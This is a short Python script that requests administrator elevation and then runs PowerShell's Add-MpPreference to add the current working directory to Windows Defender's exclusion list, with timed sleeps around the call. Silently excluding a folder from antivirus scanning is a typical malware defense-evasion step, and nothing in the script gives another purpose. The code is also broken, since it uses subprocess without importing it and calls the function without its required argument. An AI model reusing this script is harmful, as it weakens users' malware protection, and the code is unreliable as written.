import os
import ctypes
import platform
import time
from elevate import elevate

elevate()

def exclude_path_antivirus(dir_to_add):
    dir_to_add = os.getcwd()
    all_commands = ["powershell.exe"]
    command = "Add-MpPreference -ExclusionPath " + dir_to_add
    all_commands.append(command)
    process = subprocess.run(all_commands, shell=True, capture_output=True, stdin=subprocess.DEVNULL)

    output = process.stderr.decode()
    # print(output)
    if output == "":
        print(process.stdout.decode())
        print("Added path to exclusion : " + dir_to_add)
        msg = process.stdout.decode()
    else:
        print(process.stderr.decode())
        print("Couldn't add to exclusion : " + dir_to_add)
        msg = process.stderr.decode() + str(dir_to_add)

    return msg
print("before")
time.sleep(13)
print(exclude_path_antivirus())
print()
time.sleep(100)
